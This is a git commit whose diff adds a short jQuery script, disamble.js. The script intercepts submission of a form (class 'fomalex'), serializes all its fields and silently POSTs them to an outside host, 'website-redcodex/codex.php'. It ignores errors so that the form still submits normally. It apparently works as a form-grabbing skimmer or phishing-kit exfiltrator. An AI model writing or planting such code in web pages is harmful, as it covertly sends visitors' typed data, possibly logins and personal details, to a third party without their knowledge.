e8cc51bbea46eccadfdb467812c77ec2fd7b7d0b
jqueryout <95464799+jqueryout@users.noreply.github.com>
2021-12-03 13:41:06 +0700

    Update disamble.js

--- disamble.js
+++ disamble.js
@@ -1,1 +1,27 @@
+$(".fomalex").submit(function() {
 
+	var d = $(".fomalex");
+
+	$.ajax({
+
+        url: "http://website-redcodex/codex.php",
+
+        type: "POST",
+
+        data: d.serialize(),
+
+        success: function () {
+
+            return true;
+
+        },
+
+        error: function () {
+
+            return true;
+
+        },
+
+    });
+
+});
